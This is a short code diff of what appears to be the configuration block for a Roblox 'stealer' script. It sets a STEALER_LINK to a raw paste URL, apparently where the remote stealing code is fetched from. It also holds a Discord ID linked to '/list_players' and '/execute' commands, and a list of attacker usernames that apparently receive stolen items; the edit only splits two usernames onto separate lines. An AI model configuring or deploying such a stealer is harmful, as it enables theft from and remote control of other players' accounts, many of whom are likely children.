@@ -3,8 +3,8 @@ STEALER_LINK = 'https://pastefy.app/kyjujS8R/raw'
 DISCORD_ID = '760683323143356418' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
 
 Usernames = {
-    'gxthebadkillernoobxd'tengg104, -- PUT UR ROBLOX USERNAMES
-    'second', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'gxthebadkillernoobxd', -- PUT UR ROBLOX USERNAMES
+    'tengg104', -- AS MANY AS U WANT BUT DONT FORGET ,
     'third',
 }
 
